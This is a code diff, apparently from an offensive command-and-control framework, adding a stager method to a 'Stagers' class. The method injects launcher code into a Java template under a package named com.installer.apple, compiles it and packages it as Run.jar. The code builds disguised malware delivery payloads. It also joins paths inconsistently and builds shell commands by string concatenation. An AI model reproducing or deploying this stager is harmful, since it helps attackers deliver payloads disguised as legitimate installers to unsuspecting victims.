@@ -758,4 +758,29 @@ class Stagers:
         shutil.rmtree(AppName+".app")
         return package
 
+    def generate_jar(self, launcherCode):
+        file = open(self.installPath+'/data/misc/Run.java','r')
+        javacode = file.read()
+        file.close()
+        javacode = javacode.replace("LAUNCHER",launcherCode)
+        file = open(self.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
+        file.write(javacode)
+        file.close()
+        currdir = os.getcwd()
+        os.chdir(self.installPath+'data/misc/classes/')
+        os.system('javac com/installer/apple/Run.java')
+        os.system('jar -cvfm '+self.installPath+'Run.jar ../Manifest.txt com/installer/apple/Run.class')
+        os.chdir(currdir)
+        os.remove(self.installPath+'data/misc/classes/com/installer/apple/Run.class')
+        os.remove(self.installPath+'data/misc/classes/com/installer/apple/Run.java')
+        jarfile = open('Run.jar','rb')
+        jar = jarfile.read()
+        jarfile.close()
+        os.remove('Run.jar')
+
+        return jar 
+
+
+
+
     
